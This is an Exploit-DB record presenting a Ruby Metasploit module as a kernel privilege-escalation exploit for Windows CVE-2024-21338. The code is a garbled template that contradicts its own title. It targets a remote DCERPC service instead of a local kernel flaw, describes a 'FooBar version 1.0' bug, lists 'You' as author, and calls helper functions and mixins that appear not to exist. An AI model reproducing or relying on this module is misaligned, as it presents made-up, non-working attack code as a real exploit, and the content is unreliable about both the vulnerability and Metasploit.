{"source": "https://www.exploit-db.com/exploits/51946", "vulnName": "Microsoft Windows 10.0.17763.5458 - Kernel Privilege Escalation", "vulnEDBID": "51946", "vulnCVE": "2024-21338", "author": "E1 CODERS", "exploitType": "LOCAL", "platform": "WINDOWS", "datePublished": "2024-04-02", "vulnContent": "#############################################\n# Exploit Title :  Microsoft Windows 10.0.17763.5458 - Kernel Privilege Escalation\n# Exploit Author: E1 Coders\n# CVE: CVE-2024-21338\n#############################################\n\n \nrequire 'msf/core'\n \nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n \n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::DCERPC::MS08_067::Artifact\n \n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CVE-2024-21338 Exploit',\n        'Description' => 'This module exploits a vulnerability in FooBar version 1.0. It may lead to remote code execution.',\n        'Author' => 'You',\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2024-21338']\n        ]\n      )\n    )\n \n    register_options(\n      [\n        OptString.new('RHOST', [true, 'The target address', '127.0.0.1']),\n        OptPort.new('RPORT', [true, 'The target port', 1234])\n      ]\n    )\n  end\n \n  def check\n    connect\n \n    begin\n      impacket_artifact(dcerpc_binding('ncacn_ip_tcp'), 'FooBar')\n    rescue Rex::Post::Meterpreter::RequestError\n      return Exploit::CheckCode::Safe\n    end\n \n    Exploit::CheckCode::Appears\n  end\n \n  def exploit\n    connect\n \n    begin\n      impacket_artifact(\n        dcerpc_binding('ncacn_ip_tcp'),\n        'FooBar',\n        datastore['FooBarPayload']\n      )\n    rescue Rex::Post::Meterpreter::RequestError\n      fail_with Failure::UnexpectedReply, 'Unexpected response from impacket_artifact'\n    end\n \n    handler\n    disconnect\n  end\nend\n \n \n#refrence :  https://nvd.nist.gov/vuln/detail/CVE-2024-21338\n \n            "}